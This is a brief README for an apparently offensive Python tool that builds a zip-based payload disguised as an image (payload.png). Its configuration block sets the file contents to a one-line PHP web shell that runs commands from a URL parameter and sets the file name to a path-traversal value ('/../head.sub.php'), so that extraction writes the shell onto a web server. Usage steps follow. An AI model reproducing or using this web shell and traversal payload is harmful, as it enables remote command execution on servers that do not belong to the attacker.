# zip relocated payload generator

- python2 or 3
- relocate_zip by `luke1337`

# usage

### set the info exploit payload
```python
shell = '<?php system($_GET[x]); ?>' # file contents
target_file = '/../head.sub.php' # length of filename
```
### run
```sh
python payload_generator.py
```

you can get `payload.png`.
